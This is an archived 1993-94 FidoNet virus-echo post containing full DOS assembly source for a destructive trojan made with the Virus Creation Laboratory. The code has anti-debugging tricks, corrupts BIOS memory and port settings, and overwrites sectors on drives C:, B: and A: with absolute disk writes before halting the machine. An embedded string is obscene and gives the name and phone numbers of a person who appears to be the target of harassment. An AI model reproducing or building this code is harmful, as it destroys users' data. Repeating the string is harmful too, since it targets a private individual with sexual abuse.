;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 10 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : VCLMIKES.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Ron Toler, 2:283/718 (06 Nov 94 16:27)
;* To   : Viral Doctor
;* Subj : VCLMIKES.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
; MIKESICA.ASM -- Mike Sica v1.0
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Digital Justice

virus_type      equ     3                       ; Trojan Horse
is_encrypted    equ     0                       ; We're not encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
        assume  cs:code,ds:code,es:code,ss:code
        org     0100h

start           label   near

main            proc    near
stop_tracing:   mov     cx,09EBh
        mov     ax,0FE05h               ; Acutal move, plus a HaLT
        jmp     $-2
        add     ah,03Bh                 ; AH now equals 025h
        jmp     $-10                    ; Execute the HaLT
        mov     bx,offset null_vector   ; BX points to new routine
        push    cs                      ; Transfer CS into ES
        pop     es                      ; using a PUSH/POP
        int     021h
        mov     al,1                    ; Disable interrupt 1, too
        int     021h
        jmp     short skip_null         ; Hop over the loop
null_vector:    jmp     $                       ; An infinite loop
skip_null:      mov     byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:      mov     al,128                  ; Change here screws DEBUG
        out     021h,al                 ; If tracing then lock keyboard

        mov     ah,0Fh                  ; BIOS get video mode function
        int     010h
        xor     ah,ah                   ; BIOS set video mode function
        int     010h

        mov     dx,0045h                ; First argument is 69
        push    es                      ; Save ES
        mov     ax,040h                 ; Set extra segment to 040h
        mov     es,ax                   ; (ROM BIOS)
        mov     word ptr es:[013h],dx   ; Store new RAM ammount
        pop     es                      ; Restore ES

        mov     si,0001h                ; First argument is 1
        push    es                      ; Save ES
        xor     ax,ax                   ; Set the extra segment to
        mov     es,ax                   ; zero (ROM BIOS)
        shl     si,1                    ; Convert to word index
        mov     word ptr [si + 0407h],0 ; Zero LPT port address
        pop     es                      ; Restore ES

        mov     si,0001h                ; First argument is 1
        push    es                      ; Save ES
        xor     ax,ax                   ; Set the extra segment to
        mov     es,ax                   ; zero (ROM BIOS)
        shl     si,1                    ; Convert to word index
        mov     word ptr [si + 03FEh],0 ; Zero COM port address
        pop     es                      ; Restore ES

        mov     ax,0002h                ; First argument is 2
        mov     cx,0064h                ; Second argument is 100
        cli                             ; Disable interrupts (no Ctrl-C)
        cwd                             ; Clear DX (start with sector 0)
trash_loop:     int     026h                    ; DOS absolute write interrupt
        dec     ax                      ; Select the previous disk
        cmp     ax,-1                   ; Have we gone too far?
        jne     trash_loop              ; If not, repeat with new drive
        sti                             ; Restore interrupts

        cli                             ; Clear the interrupt flag
        hlt                             ; HaLT the computer
        jmp     short $                 ; Just to make sure

        mov     cx,0045h                ; First argument is 69
        jcxz    beep_end                ; Exit if there are no beeps
        mov     ax,0E07h                ; BIOS display char., BEL
beep_loop:      int     010h                    ; Beep
        loop    beep_loop               ; Beep until --CX = 0
beep_end:


        mov     ax,04C00h               ; DOS terminate function
        int     021h
main            endp

vcl_marker      db      "[VCL]",0               ; VCL creation marker


note    db      "!! Written By Mike Sica !!"
        db      "I Suck Big Phat Hairy Cocks!!"
        db      "Call Anytime Phor Good Head:"
        db      "794-0533 or 794-3626"
        db      "Both In The 804 Area Code!!"

finish          label   near

code            ends
        end     main

;-+-  GEcho 1.10+
; + Origin: Data Fellows BBS (2:283/718)
;=============================================================================

;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO

;/x            Include false conditionals in listing
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

